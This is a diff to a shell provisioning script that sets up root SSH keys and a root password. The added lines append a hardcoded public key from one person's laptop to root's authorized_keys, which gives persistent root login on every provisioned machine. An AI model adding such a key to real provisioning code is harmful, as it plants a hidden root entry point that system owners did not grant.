@@ -7,6 +7,8 @@ test -f /root/.ssh/id_rsa || /usr/bin/ssh-keygen -t rsa -f /root/.ssh/id_rsa -N 
 test -f /root/.ssh/id_rsa.pub || ssh-keygen -y -t rsa -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
 test -f /root/.ssh/authorized_keys || /usr/bin/cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
 
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC91aL7mwiy81Pps8Yj85P1tTCO/vqrZO+fUvHeIbQ6gzRrxnMy1mL1oRwRdzUoOKraw8tVEssDCqsY/XNIwseflhMyMUt9PwdSX9cBo4lUy74SRIyTmZqbghH/uFzg0vvsneIzYWUSNE2we5i4agsWW4IqCfOPKaw4qvM0i7cASeo1BF7a7p4xMOug6dYiGxJY4EmGS9MbkLQ/5mlrLDVK6aawLZyuxIZ6cR6S0zoqHJTj+F67Zld3m/AWljHNyCjqgua+zqSfYtVS1D45omjPC6g8KQkvkBJGg4MR6VhhvoNyB4/TZcQrdmiRSS0RQpr6qoFQHHmzQw7xhjQaaLUj ijarvis@ijarvisMacBookPro.local" >> /root/.ssh/authorized_keys
+
 if [[ $rootpass != "" ]];then
     echo $rootpass | passwd root --stdin
 else
